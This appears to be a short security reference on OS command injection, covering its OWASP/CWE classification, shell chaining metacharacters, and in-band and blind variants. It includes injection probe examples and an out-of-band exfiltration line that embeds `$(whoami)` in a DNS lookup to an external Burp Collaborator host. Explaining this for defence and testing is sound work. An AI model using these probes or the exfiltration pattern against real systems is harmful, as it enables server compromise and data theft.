# OS Command Injection — Comprehensive Overview

## 1. What is OS Command Injection?
OS command injection (also known as shell injection) is a critical security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application. This typically leads to full system compromise, remote code execution (RCE), and internal network pivoting.

In the OWASP Top 10, Command Injection is categorized under **A03:2021 — Injection** and mapped to **CWE-78**.

## 2. Command Separators & Metacharacters
Shell commands can be chained using various OS shell metacharacters:

| Character | Shell / OS | Behavior |
|---|---|---|
| `&` | Unix / Windows | Runs command in background. |
| `&&` | Unix / Windows | Sequential execution: runs 2nd command only if 1st succeeds. |
| `;` | Unix only | Sequential execution: runs 2nd command regardless of 1st exit code. |
| `\|` | Unix / Windows | Pipes stdout of 1st command into stdin of 2nd command. |
| `\|\|` | Unix / Windows | Sequential execution: runs 2nd command only if 1st fails. |
| `` `cmd` `` | Unix only | Command substitution (inline evaluation). |
| `$(cmd)` | Unix only | Modern command substitution. |
| `>` / `>>` | Unix / Windows | Output redirection to file (overwrite / append). |

## 3. Vulnerability Types
1. **In-Band / Verbose:** Output of the executed command is reflected directly in the HTTP response body.
2. **Blind (Time-Based):** Output is not reflected; confirmation is achieved by injecting delays (`ping -c 10 127.0.0.1` or `timeout 10`).
3. **Blind (Output Redirection):** Command output is redirected into a publicly accessible directory (`/var/www/images/out.txt`) and retrieved via a GET request.
4. **Blind (Out-of-Band / OAST):** Shell executes DNS/HTTP lookups to an external listener (Burp Collaborator) to confirm execution.
5. **Blind Out-of-Band Exfiltration:** Data is dynamically concatenated into a DNS query (e.g. `nslookup $(whoami).burpcollaborator.net`).
